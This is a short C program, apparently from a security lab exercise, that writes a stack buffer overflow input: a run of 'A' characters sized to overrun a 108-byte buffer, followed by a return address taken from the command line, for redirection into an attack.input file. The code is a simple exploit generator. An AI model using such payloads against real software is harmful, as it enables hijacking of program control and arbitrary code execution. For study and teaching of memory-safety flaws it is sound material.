#include <stdio.h>

int main(int argc,  char* argv[])
{
   	char str[]="AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";	//attack string greater than buffer size to overflow buffer i.e. total buffer allocated size + 4 (In this case buffer allocated size=108 + 4 (To overflow))
	printf("%s%s",str,argv[1]);		//display attack string which is redirected into attack.input file		
						//holds command line parameter i.e. here used to append target address to attack.input file to specify destination of malicious code to run on stack
	return 0;
}

